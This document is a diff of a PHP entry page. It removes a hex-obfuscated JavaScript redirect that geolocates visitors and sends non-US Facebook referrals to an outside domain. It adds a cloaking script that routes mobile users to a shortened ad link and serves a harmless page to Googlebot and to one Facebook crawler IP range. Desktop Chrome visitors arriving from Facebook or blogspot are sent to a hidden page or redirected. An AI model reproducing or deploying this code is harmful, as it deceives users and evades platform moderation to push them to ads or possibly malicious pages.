@@ -1,67 +1,50 @@
 <?php
-  function md5rand($val){
-  //abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
-      $chars="0123456789";
-      srand((double)microtime()*1000000);
-      $i = 0;
-      $pass = '' ;
-      while ($i<=$val) 
-    {
-        $num  = rand() % 10;
-        $tmp  = substr($chars, $num, 1);
-        $pass = $pass . $tmp;
-        $i++;
-      }
-    return $pass;
-    }
-      function shkronja($val){
-  //abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
-      $chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-      srand((double)microtime()*1000000);
-      $i = 0;
-      $pass = '' ;
-      while ($i<=$val)
-    {
-        $num  = rand() % 10;
-        $tmp  = substr($chars, $num, 1);
-        $pass = $pass . $tmp;
-        $i++;
-      }
-    return $pass;
-    }
+ob_start();
+require_once('includes/Mobile_Detect.php');
+require_once('includes/Browser.php');
+require_once('includes/functions.php');
+require_once('config.php');
+$detect = new Mobile_Detect;
+$browser = new Browser();
 
 
+$ads = "https://goo.gl/Y1sfDe";
+$loc = "Location:http://".$app_site;
 
-    ?>
-cooming soon.
-<?php
+$isref = false;
 
-{
-$randval = rand();
-if (strstr($_SERVER['HTTP_REFERER'], 'facebook.com') !== false) {
-  
 
-  if (strpos($_SERVER["REQUEST_URI"], 'sanx0') !== false){
-  echo '<script>
-var _0x8fa3=["\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x6F\x69\x70\x2E\x6E\x65\x6B\x75\x64\x6F\x2E\x63\x6F\x6D\x2F\x61\x70\x69","\x6F\x70\x65\x6E","\x73\x65\x6E\x64","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79","\x55\x53","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x3A\x2F\x2F\x66\x75\x74\x75\x6E\x67\x61\x2E\x63\x6F\x6D\x2F","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72"];var xmlhttpz= new XMLHttpRequest();xmlhttpz[_0x8fa3[2]](_0x8fa3[0],_0x8fa3[1],false);xmlhttpz[_0x8fa3[3]]();var get=JSON[_0x8fa3[5]](xmlhttpz[_0x8fa3[4]]);var country=get[_0x8fa3[7]][_0x8fa3[6]];if(country== _0x8fa3[8]){exit}else {top[_0x8fa3[10]][_0x8fa3[9]]= _0x8fa3[11]+ Math[_0x8fa3[13]](Math[_0x8fa3[12]]()* 99999999)} 
-</script>'; } else {
-    
-
-echo '<script>
-var _0x8fa3=["\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x6F\x69\x70\x2E\x6E\x65\x6B\x75\x64\x6F\x2E\x63\x6F\x6D\x2F\x61\x70\x69","\x6F\x70\x65\x6E","\x73\x65\x6E\x64","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79","\x55\x53","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x3A\x2F\x2F\x66\x75\x74\x75\x6E\x67\x61\x2E\x63\x6F\x6D\x2F","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72"];var xmlhttpz= new XMLHttpRequest();xmlhttpz[_0x8fa3[2]](_0x8fa3[0],_0x8fa3[1],false);xmlhttpz[_0x8fa3[3]]();var get=JSON[_0x8fa3[5]](xmlhttpz[_0x8fa3[4]]);var country=get[_0x8fa3[7]][_0x8fa3[6]];if(country== _0x8fa3[8]){exit}else {top[_0x8fa3[10]][_0x8fa3[9]]= _0x8fa3[11]+ Math[_0x8fa3[13]](Math[_0x8fa3[12]]()* 99999999)} 
-</script>';
-
-  }
+if (strpos($_SERVER["HTTP_REFERER"], 'facebook.com') !== false){
+    $isref = true;
+}
+if (strpos($_SERVER["HTTP_REFERER"], '.events') !== false){
+    $isref = true;
+}
+if (strpos($_SERVER["HTTP_REFERER"], 'blogspot.') !== false){
+    $isref = true;
 }
 
-
-
-
-else {
-     //Google brought me to this page.
-    //header("Location: https://facebook.com/search?q=".$randval);
-   exit();
-}  }
-
-
+if($detect->isMobile() || $browser->isMobile()){
+  header("Location:".$ads);
+  exit();
+}else if($browser->getBrowser() == Browser::BROWSER_GOOGLEBOT) {
+  require_once('share.php');
+}else if($browser->getBrowser() == Browser::BROWSER_CHROME && $browser->getPlatform() != Browser::PLATFORM_X11 && strpos($_SERVER["REMOTE_ADDR"], "66.220.14") === false) { 
+  if($isref == true){
+    
+    if(strrpos($_SERVER["HTTP_HOST"], $app_site) === false){
+      header($loc);
+    } else {
+      require_once("ex2.php");
+    }
+  }else{
+  require_once('share.php');
+  }
+  exit();
+}else{
+  ob_end_clean();
+  require_once('share.php');
+  exit();
+}
+ob_end_flush();
 ?>
